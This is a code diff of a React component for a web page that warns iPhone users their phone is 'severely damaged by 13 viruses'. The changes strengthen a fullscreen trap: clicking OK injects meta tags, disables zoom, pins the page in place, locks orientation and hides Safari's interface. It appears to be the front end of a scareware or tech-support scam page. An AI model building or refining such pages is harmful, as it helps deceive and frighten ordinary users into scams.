@@ -4,73 +4,60 @@ import Setting from '../assets/Settings1.webp'
 
 const Hero = () => {
     const [isFullscreen, setIsFullscreen] = useState(false);
-    const [isSafari, setIsSafari] = useState(false);
 
-    useEffect(() => {
-        // Check for Safari browser
-        const isSafariBrowser = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
-        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
-        setIsSafari(isSafariBrowser && isIOS);
-    }, []);
-
-    const handleSafariFullscreen = () => {
-        setIsFullscreen(true);
-        // Safari-specific fullscreen handling
-        document.documentElement.style.setProperty('height', '100vh', 'important');
-        document.body.style.setProperty('height', '100vh', 'important');
-        document.documentElement.style.position = 'fixed';
-        document.documentElement.style.width = '100%';
-        document.documentElement.style.overflow = 'hidden';
-        
-        // Add specific meta viewport for Safari
-        const viewportMeta = document.createElement('meta');
-        viewportMeta.name = 'viewport';
-        viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
-        document.head.appendChild(viewportMeta);
-
-        // Force scroll position to top
-        window.scrollTo(0, 0);
-    };
-
-    const toggleFullscreen = () => {
-        if (isSafari) {
-            handleSafariFullscreen();
-        } else {
-            if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen().catch((err) => {
-                    console.log(`Error attempting to enable fullscreen: ${err.message}`);
-                    handleSafariFullscreen();
-                });
+    // Function to lock orientation to portrait (iOS Safari)
+    const lockOrientation = () => {
+        try {
+            if (window.screen.orientation && window.screen.orientation.lock) {
+                window.screen.orientation.lock('portrait');
             }
-            setIsFullscreen(true);
+        } catch (error) {
+            console.log('Orientation lock not supported');
         }
     };
 
-    const safariFullscreenStyle = isFullscreen && isSafari ? {
-        position: 'fixed',
-        top: 0,
-        left: 0,
-        width: '100%',
-        height: '100vh',
-        minHeight: '-webkit-fill-available',
-        overflow: 'hidden',
-        WebkitOverflowScrolling: 'touch',
-        backgroundColor: 'white',
-        zIndex: 9999,
-    } : {};
+    // Handle Safari fullscreen
+    const enterFullscreen = () => {
+        setIsFullscreen(true);
+        
+        // Add meta tags for proper Safari fullscreen
+        const meta = document.createElement('meta');
+        meta.name = 'apple-mobile-web-app-capable';
+        meta.content = 'yes';
+        document.getElementsByTagName('head')[0].appendChild(meta);
 
-    // iOS-specific spacing classes
-    const bottomSpacing = isSafari ? "bottom-32 md:bottom-36" : "bottom-16 md:bottom-20";
-    const bottomButtonSpacing = isSafari ? "bottom-16 md:bottom-20" : "bottom-4 md:bottom-6";
+        // Force viewport settings
+        const viewport = document.querySelector("meta[name=viewport]");
+        viewport.setAttribute('content', 
+            'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover');
+
+        // Apply fullscreen styles
+        document.documentElement.style.setProperty('--vh', `${window.innerHeight * 0.01}px`);
+        document.body.style.setProperty('overflow', 'hidden', 'important');
+        document.body.style.setProperty('position', 'fixed', 'important');
+        document.body.style.setProperty('width', '100%', 'important');
+        document.body.style.setProperty('min-height', '100vh', 'important');
+        document.body.style.setProperty('min-height', '-webkit-fill-available', 'important');
+
+        // Lock orientation
+        lockOrientation();
+
+        // Hide Safari UI
+        setTimeout(() => {
+            window.scrollTo(0, 1);
+        }, 100);
+    };
 
     return (
-      <div 
-        className={`${
-          isFullscreen 
-            ? 'fixed inset-0 bg-white z-[9999] min-h-screen w-screen overflow-hidden touch-none' 
-            : 'px-6 py-8 max-w-4xl mx-auto'
-          } relative font-geologica md:px-8 lg:px-10`}
-        style={{ ...safariFullscreenStyle }}
+      <div className={`relative font-geologica ${
+        isFullscreen 
+          ? 'fixed inset-0 bg-white min-h-screen h-screen w-screen z-[9999] overflow-hidden' 
+          : 'px-6 py-8 max-w-4xl mx-auto'
+        } md:px-8 lg:px-10`}
+        style={isFullscreen ? {
+            height: 'calc(var(--vh, 1vh) * 100)',
+            WebkitOverflowScrolling: 'touch'
+        } : {}}
       >
         <h1 className="text-[18px] before:leading-[28px] text-ligh-red font-normal mb-[24px] md:text-[20px] lg:text-[22px]">
           Warning Your Apple iPhone is severely damaged by 13 viruses
@@ -95,9 +82,9 @@ const Hero = () => {
         </div>
 
         {/* Center Modal */}
-        <div className={`fixed ${isSafari ? 'top-1/3' : 'top-1/2'} left-1/2 transform -translate-x-1/2 -translate-y-1/2 
+        <div className="fixed top-1/3 left-1/2 transform -translate-x-1/2 -translate-y-1/2 
                 bg-[#1b1b1b]/90 p-4 rounded-xl h-[200px] w-[280px] text-center shadow-2xl z-50
-                md:w-[320px] md:h-[220px] lg:w-[360px] lg:h-[240px]`}>
+                md:w-[320px] md:h-[220px] lg:w-[360px] lg:h-[240px]">
           <div className="flex justify-center mb-3">
             <img 
               src={Warning} 
@@ -112,7 +99,7 @@ const Hero = () => {
           </div>
           
           <button 
-            onClick={toggleFullscreen}
+            onClick={enterFullscreen}
             className="w-full bg-[#ff4b4b] !text-whitish py-2 rounded-lg hover:bg-[#ff3b30] transition-colors text-xs md:text-sm"
           >
             OK
@@ -120,8 +107,8 @@ const Hero = () => {
         </div>
 
         {/* Bottom Notifications */}
-        <div className={`fixed ${bottomSpacing} left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50 
-                md:w-[320px] lg:w-[360px]`}>
+        <div className="fixed bottom-32 left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50 
+                md:w-[320px] lg:w-[360px] md:bottom-36">
           <div className="p-4 flex items-start gap-3 md:p-5">
             <div className="relative">
               <img 
@@ -139,10 +126,10 @@ const Hero = () => {
         </div>
 
         {/* Bottom OK Button */}
-        <div className={`fixed ${bottomButtonSpacing} left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50
-                md:w-[320px] lg:w-[360px]`}>
+        <div className="fixed bottom-16 left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50
+                md:w-[320px] lg:w-[360px] md:bottom-20">
           <button 
-            onClick={toggleFullscreen}
+            onClick={enterFullscreen}
             className="w-full py-2.5 text-center text-sm font-medium"
           >
             OK
